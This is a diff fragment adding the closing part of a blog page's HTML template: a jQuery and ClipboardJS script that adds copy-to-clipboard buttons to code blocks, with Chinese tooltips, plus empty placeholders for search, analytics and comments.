+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
